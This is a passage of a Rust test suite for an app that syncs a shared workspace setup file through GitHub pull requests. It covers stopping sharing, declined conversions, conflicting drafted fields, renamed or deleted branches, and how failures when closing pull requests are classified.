    let publisher = FakePublisher::default();
    publisher.pr_states.borrow_mut().insert(231, PrState::Open);
    stop(&fx.stores(), &FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(231))), &publisher, &fx.ws_id, 7).unwrap();
    // A page's read (it asks GitHub nothing) finds the file gone.
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    let report = refresh_with(&fx.stores(), &repo, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    assert_eq!(report.sharing, None, "said once the pull requests were dealt with");
    let sharing = fx.cache().unwrap().sharing.unwrap();
    assert_eq!(sharing.state, SharingState::StoppedHere);
    assert_eq!(sharing.to_close.iter().map(|pr| pr.number).collect::<Vec<_>>(), vec![12, 15, 18]);
    assert!(publisher.closed.borrow().is_empty());
    assert_eq!(sharing.removal.as_ref().map(|pr| pr.number), Some(231), "they wait on the removal's own pull request");
    // Round 5: the file is gone, but the removal's pull request doesn't read
    // merged yet: nothing is closed on that.
    publisher.pr_states.borrow_mut().insert(18, PrState::Closed);
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(report.sharing, None);
    assert!(publisher.closed.borrow().is_empty());
    // It reads merged: closed after the read, and said.
    publisher.pr_states.borrow_mut().insert(231, PrState::Merged);
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(
        report.sharing,
        Some(SharingNote::Stopped { branch: "main".into(), closed: vec![12, 15], left_open: vec![] })
    );
    let sharing = fx.cache().unwrap().sharing.unwrap();
    assert!(sharing.to_close.is_empty() && sharing.removal.is_none());
    // Said once.
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(report.sharing, None);
    assert_eq!(publisher.closed.borrow().len(), 2);
}

/// A cache written by round 2 (no `toClose`) reads.
#[test]
fn c1r3_an_answer_saved_before_reads_with_nothing_to_close() {
    let sharing: crate::stop_sharing::Sharing =
        serde_json::from_str(r#"{ "state": "stoppedHere", "at": 5, "who": null, "branch": "main", "leftOpen": [12] }"#).unwrap();
    assert!(sharing.to_close.is_empty());
    assert_eq!(sharing.left_open, vec![12]);
    assert!(!serde_json::to_string(&sharing).unwrap().contains("toClose"));
}

// ── 1.175.0 (C2, SC-1): a declined conversion is not proposed again ───

/// A repository whose setup is in the older file, its conversion waiting in
/// pull request #214.
fn conversion_waiting() -> (Fixture, FakeRepo, FakePublisher) {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.put("main", LEGACY_PATH, PLY_LEGACY, "a", "c0");
    fx.refresh(&repo);
    assert!(crate::workspace_adoption::may_convert_by_itself(&fx.cache().unwrap(), false));
    queue_definition(&fx.stores(), &fx.ws_id).unwrap();
    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        pull_request: removal_pr(214),
        fields: Vec::new(),
        conflicts: Default::default(),
    });
    publisher.pr_states.borrow_mut().insert(214, PrState::Open);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert_eq!(fx.queue().create_pull_request.as_ref().map(|p| p.number), Some(214));
    (fx, repo, publisher)
}

#[test]
fn c2_a_conversion_closed_without_merging_is_remembered_and_not_run_again_by_itself() {
    let (fx, repo, publisher) = conversion_waiting();
    publisher.pr_states.borrow_mut().insert(214, PrState::Closed);
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert_eq!(report.closed_pull_requests, vec![214]);
    assert_eq!(report.conversion_declined, Some(214), "the toast says the setup stays in its older file");
    let cache = fx.cache().unwrap();
    let declined = cache.conversion_declined.clone().expect("remembered");
    assert_eq!((declined.pull_request, declined.seen), (214, false));
    assert!(!crate::workspace_adoption::may_convert_by_itself(&cache, false));
    assert!(fx.queue().is_empty());

    // Restart twice, read each time: still declined, nothing published.
    let fx = fx.restart();
    fx.refresh(&repo);
    let fx = fx.restart();
    refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Open).unwrap();
    let cache = fx.cache().unwrap();
    assert_eq!(cache.source, DefinitionSource::Legacy);
    assert!(cache.conversion_declined.is_some());
    assert!(!crate::workspace_adoption::may_convert_by_itself(&cache, false));
    assert_eq!(publisher.requests.borrow().len(), 1, "only the first proposal");
    // Everything works as before on this computer.
    assert_eq!(fx.ws().name, "Ply");
}

#[test]
fn c2_propose_it_again_forgets_the_refusal_and_opens_a_pull_request_on_the_press() {
    let (fx, repo, publisher) = conversion_waiting();
    publisher.pr_states.borrow_mut().insert(214, PrState::Closed);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    crate::workspace_adoption::conversion_notice_seen(&fx.stores(), &fx.ws_id).unwrap();
    assert!(fx.cache().unwrap().conversion_declined.unwrap().seen);

    crate::workspace_adoption::propose_again(&fx.stores(), &fx.ws_id).unwrap();
    assert!(fx.cache().unwrap().conversion_declined.is_none());
    queue_definition(&fx.stores(), &fx.ws_id).unwrap();
    let again = FakePublisher::default().then(PublishOutcome::PullRequest {
        pull_request: removal_pr(230),
        fields: Vec::new(),
        conflicts: Default::default(),
    });
    let report = publish_pending(&fx.stores(), &repo, &again, &fx.ws_id).unwrap().unwrap();
    assert_eq!(report.pull_request.map(|p| p.number), Some(230));
    assert!(again.requests.borrow()[0].2.is_some(), "the conversion creates the file");
    // Nothing to propose twice.
    assert!(crate::workspace_adoption::propose_again(&fx.stores(), &fx.ws_id).is_err());
    // Closed again: remembered again, unseen.
    again.pr_states.borrow_mut().insert(230, PrState::Closed);
    publish_pending(&fx.stores(), &repo, &again, &fx.ws_id).unwrap().unwrap();
    let declined = fx.cache().unwrap().conversion_declined.unwrap();
    assert_eq!((declined.pull_request, declined.seen), (230, false));
}

#[test]
fn c2_another_computer_converting_clears_the_refusal() {
    let (fx, repo, publisher) = conversion_waiting();
    publisher.pr_states.borrow_mut().insert(214, PrState::Closed);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "example-teammate", "c5");
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert_eq!(cache.source, DefinitionSource::Repo);
    assert!(cache.conversion_declined.is_none());
}

#[test]
fn c2_a_merged_conversion_and_a_closed_setting_are_not_a_declined_conversion() {
    // Merged: the branch has the file.
    let (fx, repo, publisher) = conversion_waiting();
    publisher.pr_states.borrow_mut().insert(214, PrState::Merged);
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert_eq!(report.conversion_declined, None);
    assert!(fx.cache().unwrap().conversion_declined.is_none());
    // A shared setup's own creation pull request (Share on a protected
    // branch), closed: not the older file's conversion.
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.branches.borrow_mut().insert("main".into());
    crate::workspace_adoption::share(&fx.stores(), &repo, &fx.ws_id, "MatteoB-adv/atelier", 0).unwrap();
    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        pull_request: removal_pr(300),
        fields: Vec::new(),
        conflicts: Default::default(),
    });
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    publisher.pr_states.borrow_mut().insert(300, PrState::Closed);
    let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert_eq!(report.closed_pull_requests, vec![300]);
    assert_eq!(report.conversion_declined, None);
    assert!(fx.cache().unwrap().conversion_declined.is_none());
}

/// Migration: a cache 1.174.5 wrote for a repository on the older file reads,
/// and converts by itself as before.
#[test]
fn c2_a_cache_1_174_5_wrote_reads_with_no_declined_conversion() {
    let cache: DefinitionCache = serde_json::from_str(
        r#"{ "schemaVersion": 1,
             "definition": { "schemaVersion": 1, "name": "Ply", "board": "githubIssues", "githubOwnerRepo": "MatteoB-adv/atelier" },
             "source": "legacy", "branch": "main", "commit": "c0", "author": "a",
             "refreshedAt": 5, "unreadable": null, "pending": {}, "pendingState": null }"#,
    )
    .unwrap();
    assert!(cache.conversion_declined.is_none());
    assert!(crate::workspace_adoption::may_convert_by_itself(&cache, false));
    assert!(!serde_json::to_string(&cache).unwrap().contains("conversionDeclined"));
    // And one written with it reads back.
    let mut with = cache.clone();
    with.conversion_declined = Some(crate::workspace_adoption::ConversionDeclined { pull_request: 214, who: None, at: 9, seen: true });
    let back: DefinitionCache = serde_json::from_str(&serde_json::to_string(&with).unwrap()).unwrap();
    assert_eq!(back.conversion_declined, with.conversion_declined);
}

// ── C1 round 5 ────────────────────────────────────────────────────────

/// The file went while this computer's removal waited — but by a teammate's
/// hand, and the removal's pull request was closed: nothing is closed for
/// it; the settings pull requests are named.
#[test]
fn c1r5_settings_pull_requests_are_closed_only_once_the_removals_own_pull_request_merged() {
    let (fx, repo) = shared();
    following(&fx);
    let publisher = FakePublisher::default();
    for n in [12, 15, 18, 231] {
        publisher.pr_states.borrow_mut().insert(n, PrState::Open);
    }
    stop(&fx.stores(), &FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(231))), &publisher, &fx.ws_id, 7).unwrap();
    repo.remove_by("main", DEFINITION_PATH, "example-teammate", "c2");
    refresh_with(&fx.stores(), &repo, &fx.ws_id, RefreshMoment::PageRead).unwrap();
    publisher.pr_states.borrow_mut().insert(231, PrState::Closed);
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(
        report.sharing,
        Some(SharingNote::Stopped { branch: "main".into(), closed: vec![], left_open: vec![12, 15, 18] })
    );
    assert!(publisher.closed.borrow().is_empty(), "the removal didn't merge: nothing is closed");
    assert_eq!(fx.cache().unwrap().sharing.unwrap().left_open, vec![12, 15, 18]);
}

/// The removal merged, and before this computer read again someone shared
/// the setup again: the read comes first, and nothing is closed.
#[test]
fn c1r5_nothing_is_closed_when_the_read_finds_the_setup_shared_again() {
    let (fx, repo) = shared();
    following(&fx);
    let publisher = FakePublisher::default();
    for n in [12, 15, 18, 231] {
        publisher.pr_states.borrow_mut().insert(n, PrState::Open);
    }
    stop(&fx.stores(), &FakeRemover::then(RemovalOutcome::PullRequest(removal_pr(231))), &publisher, &fx.ws_id, 7).unwrap();
    publisher.pr_states.borrow_mut().insert(231, PrState::Merged);
    // The file is on the branch again by the time this computer reads.
    repo.put("main", DEFINITION_PATH, &with_verify("scripts/again.sh"), "example-teammate", "c7");
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert!(publisher.closed.borrow().is_empty(), "shared again: its pull requests are not closed");
    // Owner, 2026-11-10: what is said is that giulia shared it again.
    assert_eq!(report.sharing, Some(SharingNote::SharedAgain { who: Some("example-teammate".into()), board: None }));
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_some() && cache.sharing.is_none());
}

// ── 1.175.0 (C3, SC-3): a drafted field the repository moved meanwhile ──

/// B drafted "Checks before shipping" from `ppvp.sh` to `mine.sh`; before B
/// published, A put `theirs.sh` on the branch and B's read applied it. The
/// page's save says the base was `ppvp.sh`: the queue keeps that, so the
/// publish asks which to keep instead of writing over A's.
#[test]
fn c3_a_drafted_fields_base_is_what_it_was_changed_from_not_what_arrived_meanwhile() {
    let (fx, repo) = shared();
    repo.put("main", DEFINITION_PATH, &with_verify("scripts/theirs.sh"), "example-teammate", "c2");
    fx.refresh(&repo);
    let latest = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap();
    assert_eq!(latest.verify_pipeline, Some(vec![VerifyKind::Script { path: "scripts/theirs.sh".into() }]));

    let mut base = to_map(&latest);
    base.insert("verifyPipeline".into(), serde_json::json!([{ "kind": "script", "path": "scripts/ppvp.sh" }]));
    let mut draft = base.clone();
    draft.insert("verifyPipeline".into(), serde_json::json!([{ "kind": "script", "path": "scripts/mine.sh" }]));
    let view = save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    // C3 round 2: the view returned says what the queue now holds.
    assert_eq!(view.queue.fields["verifyPipeline"].base, serde_json::json!([{ "kind": "script", "path": "scripts/ppvp.sh" }]));
    let entry = fx.queue().fields.get("verifyPipeline").cloned().expect("queued");
    assert_eq!(entry.value, serde_json::json!([{ "kind": "script", "path": "scripts/mine.sh" }]));
    assert_eq!(
        entry.base,
        serde_json::json!([{ "kind": "script", "path": "scripts/ppvp.sh" }]),
        "what B changed from, not A's value"
    );
    // The channel asks: base ≠ what the branch holds.
    assert_ne!(entry.base_against(&serde_json::json!([{ "kind": "script", "path": "scripts/theirs.sh" }])), serde_json::json!([{ "kind": "script", "path": "scripts/theirs.sh" }]));

    // A field whose base is what the branch holds (only read differently,
    // the default branch left unset) is no question.
    let (fx, repo) = shared();
    let latest = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap();
    let mut base = to_map(&latest);
    base.insert("integrationBranch".into(), Value::from("main"));
    let mut draft = base.clone();
    draft.insert("integrationBranch".into(), Value::from("staging"));
    repo.branches.borrow_mut().insert("staging".into());
    save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    let entry = fx.queue().fields.get("integrationBranch").cloned().expect("queued");
    assert_eq!(entry.base, field_value(&to_map(&latest.normalized("main")), "integrationBranch"));
}

// ── 1.175.0 (C4, SC-4): the creation pull request another computer made unneeded ──

/// This computer shared on a protected branch (creation pull request #215);
/// example-teammate's share merged first. A read finds the file from her commit.
fn shared_first_setup() -> (Fixture, FakeRepo, FakePublisher) {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    repo.branches.borrow_mut().insert("main".into());
    crate::workspace_adoption::share(&fx.stores(), &repo, &fx.ws_id, "MatteoB-adv/atelier", 0).unwrap();
    let publisher = FakePublisher::default().then(PublishOutcome::PullRequest {
        pull_request: removal_pr(215),
        fields: Vec::new(),
        conflicts: Default::default(),
    });
    publisher.pr_states.borrow_mut().insert(215, PrState::Open);
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert_eq!(fx.queue().create_pull_request.as_ref().map(|p| p.number), Some(215));
    repo.put("main", DEFINITION_PATH, PLY_DEFINITION, "example-teammate", "c9");
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().source, DefinitionSource::Repo);
    (fx, repo, publisher)
}

#[test]
fn c4_this_computers_creation_pull_request_is_closed_once_the_setup_arrived_from_another() {
    let (fx, repo, publisher) = shared_first_setup();
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    let first = report.publish.and_then(|p| p.shared_first).expect("said");
    assert_eq!((first.number, first.outcome, first.who.as_deref()), (215, SharedFirstOutcome::Closed, Some("example-teammate")));
    assert!(fx.queue().shared_first_left.is_none());
    assert_eq!(*publisher.closed.borrow(), vec![215]);
    let queue = fx.queue();
    assert!(queue.create_pull_request.is_none() && !queue.create_definition);
    assert_eq!(fx.cache().unwrap().pending_state, None, "no longer waiting");
    // Said once.
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert!(report.publish.and_then(|p| p.shared_first).is_none());
}

#[test]
fn c4r2_a_close_nobody_answered_is_tried_again_silently_and_a_refused_one_is_named_once() {
    // No answer (offline, a timeout): nothing said, tried again next time.
    let (fx, repo, publisher) = shared_first_setup();
    *publisher.close_error.borrow_mut() = Some("gh pr close timed out after 30.0s".into());
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert!(report.publish.and_then(|p| p.shared_first).is_none(), "nothing to say yet");
    assert_eq!(fx.queue().create_pull_request.as_ref().map(|p| p.number), Some(215));
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert!(report.publish.and_then(|p| p.shared_first).is_none(), "still silent");
    // Refused: said once, no longer followed, named on the page.
    *publisher.close_error.borrow_mut() = Some("gh pr close failed: GraphQL: Resource not accessible by integration (closePullRequest)".into());
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(report.publish.and_then(|p| p.shared_first).map(|f| f.outcome), Some(SharedFirstOutcome::Refused));
    let queue = fx.queue();
    assert!(queue.create_pull_request.is_none());
    assert_eq!(queue.shared_first_left.as_ref().map(|f| f.number), Some(215));
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert!(report.publish.and_then(|p| p.shared_first).is_none(), "said once");
}

/// Not this computer's in origin's repository now: never closed, and named
/// as no longer followed.
#[test]
fn c4r2_a_pull_request_that_isnt_ours_any_more_is_no_longer_followed() {
    let (fx, repo, publisher) = shared_first_setup();
    *publisher.not_ours.borrow_mut() = true;
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert_eq!(report.publish.and_then(|p| p.shared_first).map(|f| f.outcome), Some(SharedFirstOutcome::NotOurs));
    assert!(publisher.closed.borrow().is_empty());
    assert_eq!(fx.queue().shared_first_left.map(|f| f.outcome), Some(SharedFirstOutcome::NotOurs));
}

/// Migration: a queue from before reads with nothing left open.
#[test]
fn c4r2_a_queue_from_before_reads_with_nothing_left_open() {
    let queue: PublishQueue = serde_json::from_str(r#"{ "schemaVersion": 1, "lastError": null }"#).unwrap();
    assert!(queue.shared_first_left.is_none());
    assert!(!serde_json::to_string(&queue).unwrap().contains("sharedFirstLeft"));
}

#[test]
fn c4_nothing_is_closed_while_github_cant_say_or_when_it_merged() {
    // GitHub can't say: it may be the very pull request that put the file
    // there — nothing is closed, nothing said.
    let (fx, repo, publisher) = shared_first_setup();
    publisher.pr_states.borrow_mut().clear();
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert!(report.publish.and_then(|p| p.shared_first).is_none());
    assert!(publisher.closed.borrow().is_empty());
    // Its own pull request merged: settled as before, no "shared first".
    publisher.pr_states.borrow_mut().insert(215, PrState::Merged);
    let report = refresh_and_publish(&fx.stores(), &repo, &publisher, &fx.ws_id, RefreshMoment::Periodic).unwrap();
    assert!(report.publish.and_then(|p| p.shared_first).is_none());
    assert!(publisher.closed.borrow().is_empty());
    assert!(fx.queue().create_pull_request.is_none());
}

/// The trouble kind follows the words through the drain, and only a
/// network that is missing is "offline".
#[test]
fn c4_the_drain_keeps_the_kind_and_offline_only_for_the_network() {
    for (outcome, offline, kind) in [
        (
            PublishOutcome::Unreachable("fatal: could not read Username for 'https://github.com': terminal prompts disabled".into()),
            false,
            crate::shared_config::PublishTrouble::GitSignIn,
        ),
        (
            PublishOutcome::Unreachable("gh pr list failed: To get started with GitHub CLI, please run:  gh auth login".into()),
            false,
            crate::shared_config::PublishTrouble::GhSignedOut,
        ),
        (
            PublishOutcome::Unreachable("Could not resolve host: github.com".into()),
            true,
            crate::shared_config::PublishTrouble::Network,
        ),
    ] {
        let (fx, repo) = shared();
        fx.workspaces.set_accent_color(&fx.ws_id, Some("#0ea5e9".into())).unwrap();
        record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
        let publisher = FakePublisher::default().then(outcome);
        let report = publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
        assert_eq!(report.offline, offline);
        assert_eq!(report.trouble.as_ref(), Some(&kind));
        let queue = fx.queue();
        assert_eq!(queue.last_offline, offline);
        assert_eq!(queue.last_error_kind, Some(kind));
    }
}

// ── 1.175.0 (C5, SC-5 / SC-8) ─────────────────────────────────────────

/// `main`'s copy of the shared setup names `staging`, read from `staging`.
fn on_staging() -> (Fixture, FakeRepo) {
    let fx = Fixture::new();
    let repo = FakeRepo::new();
    let named = PLY_DEFINITION.replace("\"name\": \"Ply\",", "\"name\": \"Ply\",\n  \"integrationBranch\": \"staging\",");
    repo.put("main", DEFINITION_PATH, &named, "a", "c1");
    repo.put("staging", DEFINITION_PATH, &named, "a", "c1");
    fx.refresh(&repo);
    fx.refresh(&repo);
    assert_eq!(fx.cache().unwrap().branch.as_deref(), Some("staging"));
    (fx, repo)
}

/// GitHub renames `staging` to `develop` (the files go with it).
fn rename(repo: &FakeRepo, from: &str, to: &str) {
    let file = repo.read(from, DEFINITION_PATH).unwrap();
    repo.put(to, DEFINITION_PATH, std::str::from_utf8(&file.bytes).unwrap(), "a", "c1");
    repo.gone.borrow_mut().insert(from.to_string());
    repo.renamed.borrow_mut().insert(from.to_string(), to.to_string());
}

#[test]
fn c5_a_renamed_branch_is_said_with_its_new_name_and_is_not_a_removed_setup() {
    let (fx, repo) = on_staging();
    rename(&repo, "staging", "develop");
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.definition.is_some(), "the setup is still shared");
    assert!(cache.removed.is_none(), "a branch gone is not the setup removed");
    assert_eq!(
        cache.branch_gone,
        Some(BranchGone { branch: "staging".into(), renamed_to: Some("develop".into()) })
    );
    // "Move to develop": recorded and published there; the file there says develop.
    crate::move_shared_setup::move_to_renamed(&fx.stores(), &repo, &fx.ws_id, "develop").unwrap();
    assert_eq!(fx.cache().unwrap().pending.get("integrationBranch"), Some(&Value::from("develop")));
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    let (branch, fields, _) = publisher.requests.borrow()[0].clone();
    assert_eq!(branch, "develop", "not the gone branch");
    assert_eq!(fields["integrationBranch"].value, Value::from("develop"));
    // Only to the name GitHub gave it.
    assert!(crate::move_shared_setup::move_to_renamed(&fx.stores(), &repo, &fx.ws_id, "main").is_err());
    // Once the setup is read from develop, nothing is gone any more.
    let named = std::str::from_utf8(&repo.read("develop", DEFINITION_PATH).unwrap().bytes).unwrap().replace("staging", "develop");
    repo.put("develop", DEFINITION_PATH, &named, "a", "c2");
    repo.put("main", DEFINITION_PATH, &named, "a", "c2");
    fx.refresh(&repo);
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert_eq!(cache.branch.as_deref(), Some("develop"));
    assert!(cache.branch_gone.is_none());
}

#[test]
fn c5_a_deleted_branch_and_cards_go_to_chosen_elsewhere_publish_there_and_create_the_file() {
    let (fx, repo) = on_staging();
    repo.remove("staging", DEFINITION_PATH);
    repo.gone.borrow_mut().insert("staging".into());
    repo.branches.borrow_mut().insert("release".into());
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert_eq!(cache.branch_gone, Some(BranchGone { branch: "staging".into(), renamed_to: None }));
    assert!(cache.removed.is_none() && cache.definition.is_some());
    // Before a choice: an edit is published nowhere — not onto the copy the
    // read fell back to on main.
    fx.workspaces.set_accent_color(&fx.ws_id, Some("#0ea5e9".into())).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    let held = FakePublisher::default();
    let report = publish_pending(&fx.stores(), &repo, &held, &fx.ws_id).unwrap().unwrap();
    assert!(held.requests.borrow().is_empty());
    assert!(report.error.unwrap().contains(crate::shared_config::BRANCH_MISSING_MARKER));
    assert!(cache.definition.is_some());
    // "Cards go to" → release, from Settings.
    let latest = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap();
    let base = to_map(&latest);
    let mut draft = base.clone();
    draft.insert("integrationBranch".into(), Value::from("release"));
    save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    let (branch, _, create_from) = publisher.requests.borrow()[0].clone();
    assert_eq!(branch, "release");
    assert!(create_from.is_some(), "created there: its history never deleted the file");
    // A chosen branch whose history deleted the file creates nothing.
    let (fx, repo) = on_staging();
    repo.remove("staging", DEFINITION_PATH);
    repo.gone.borrow_mut().insert("staging".into());
    repo.branches.borrow_mut().insert("release".into());
    fx.refresh(&repo);
    let latest = get_view(&fx.stores(), &repo, &fx.ws_id).unwrap().effective.unwrap();
    let base = to_map(&latest);
    let mut draft = base.clone();
    draft.insert("integrationBranch".into(), Value::from("release"));
    save_changes(&fx.stores(), &repo, &fx.ws_id, base, draft).unwrap();
    for answer in [Deletion::Deleted("c0".into(), None, None), Deletion::CantSay] {
        *repo.deleted.borrow_mut() = Some(answer);
        let publisher = FakePublisher::default()
            .then(PublishOutcome::Failed("release has no .atelier/workspace.json to change".into()));
        publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
        assert!(publisher.requests.borrow()[0].2.is_none());
    }
}

/// C5 and Stop sharing meet: one function asks of a branch that is there,
/// the other of a branch that is gone; offline is neither.
#[test]
fn c5_a_gone_branch_a_removed_setup_and_offline_are_told_apart() {
    // Branch there, file gone, deleted in its history: removed (lane 1).
    let (fx, repo) = on_staging();
    repo.remove_by("staging", DEFINITION_PATH, "example-teammate", "c2");
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.removed.is_some() || cache.definition.is_some());
    assert!(cache.branch_gone.is_none(), "the branch is there: not C5");
    // Branch gone: C5, never "removed".
    let (fx, repo) = on_staging();
    repo.remove("staging", DEFINITION_PATH);
    repo.gone.borrow_mut().insert("staging".into());
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.removed.is_none() && cache.definition.is_some());
    assert!(cache.branch_gone.is_some());
    // Offline (git can't say): neither, and an earlier "gone" is kept.
    let (fx, mut repo) = on_staging();
    repo.fetch_error = Some("fatal: unable to access: Could not resolve host: github.com".into());
    fx.refresh(&repo);
    let cache = fx.cache().unwrap();
    assert!(cache.removed.is_none() && cache.branch_gone.is_none() && cache.definition.is_some());
}

#[test]
fn c5_a_member_who_cant_push_stops_retrying_and_can_use_the_teams_values() {
    let (fx, repo) = shared();
    fx.workspaces.set_accent_color(&fx.ws_id, Some("#0ea5e9".into())).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    let mut queue = fx.queue();
    queue.fields.get_mut("accentColor").unwrap().pull_request = Some(removal_pr(15));
    save_queue(&fx.configs, &fx.ws_id, &queue).unwrap();
    // GitHub says this account can't push.
    *repo.permission.borrow_mut() = Some(false);
    fx.refresh(&repo);
    let publisher = FakePublisher::default();
    assert!(publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().is_none());
    assert!(publisher.requests.borrow().is_empty(), "no attempt while it can't push");
    assert_eq!(fx.ws().accent_color.as_deref(), Some("#0ea5e9"), "still this Mac's value meanwhile");

    let used = crate::move_shared_setup::use_team_values(&fx.stores(), &fx.ws_id).unwrap();
    assert_eq!(used.dropped, vec![field_label("accentColor").to_string()]);
    assert_eq!(used.left_open, vec![15], "named, never closed");
    assert!(publisher.closed.borrow().is_empty());
    assert!(fx.queue().fields.is_empty());
    assert!(fx.cache().unwrap().pending.is_empty());
    fx.refresh(&repo);
    assert_eq!(fx.ws().accent_color.as_deref(), Some("#7c3aed"), "the repository's value is applied");
    // Nothing more to give up.
    assert!(crate::move_shared_setup::use_team_values(&fx.stores(), &fx.ws_id).is_err());

    // Access back: the drain runs again.
    let (fx, repo) = shared();
    fx.workspaces.set_accent_color(&fx.ws_id, Some("#0ea5e9".into())).unwrap();
    record_local_edit(&fx.stores(), &repo, &fx.ws_id, false).unwrap().unwrap();
    *repo.permission.borrow_mut() = Some(false);
    fx.refresh(&repo);
    assert!(publish_pending(&fx.stores(), &repo, &FakePublisher::default(), &fx.ws_id).unwrap().is_none());
    *repo.permission.borrow_mut() = Some(true);
    fx.refresh(&repo);
    let publisher = FakePublisher::default();
    publish_pending(&fx.stores(), &repo, &publisher, &fx.ws_id).unwrap().unwrap();
    assert_eq!(publisher.requests.borrow().len(), 1);
    // A member who can push isn't offered to give up.
    assert!(crate::move_shared_setup::use_team_values(&fx.stores(), &fx.ws_id).is_err());
}

/// Migration: a 1.174.5 cache reads with no gone branch.
#[test]
fn c5_a_cache_1_174_5_wrote_reads_with_no_gone_branch() {
    let cache: DefinitionCache = serde_json::from_str(
        r#"{ "schemaVersion": 1, "definition": { "schemaVersion": 1, "name": "Ply" }, "source": "repo",
             "branch": "staging", "commit": "c1", "refreshedAt": 1, "unreadable": null, "pending": {}, "pendingState": null }"#,
    )
    .unwrap();
    assert!(cache.branch_gone.is_none());
    assert!(!serde_json::to_string(&cache).unwrap().contains("branchGone"));
}

// ── 1.175.0 (C5 round 2): a close that failed for a passing reason ─────

#[test]
fn c5r2_a_close_github_couldnt_answer_now_is_no_answer_and_only_a_refusal_is_refused() {
    for passing in [
        "gh pr close timed out after 30.0s",
        "gh pr close failed: HTTP 502: Bad Gateway (https://api.github.com/graphql)",
        "gh pr close failed: HTTP 503: Service Unavailable",
        "gh pr close failed: API rate limit exceeded for user ID 4242. (HTTP 403)",
        "gh pr close failed: You have exceeded a secondary rate limit.",
        "gh pr close failed: context deadline exceeded",
        "gh pr close failed: error connecting to api.github.com",
    ] {
        assert!(close_got_no_answer(passing), "{passing}");
    }
    for refused in [
        "gh pr close failed: GraphQL: Resource not accessible by integration (closePullRequest)",
        "gh pr close failed: HTTP 403: Must have admin rights to Repository.",
        "gh pr close failed: HTTP 401: Bad credentials",
        "gh pr close failed: unknown error",
        // #1401 is a number, not a status.
        "gh pr close failed: could not close pull request #1401",
    ] {
        assert!(!close_got_no_answer(refused), "{refused}");
    }
}

// ── WALKFIX-1 (the Mac walk of 2026-11-10): no other branch's setup by itself ──

/// The walk's sandbox: this project's setup lives on `w1175-int` (named by
/// the copy `main` had when it was first read), and `main` now holds
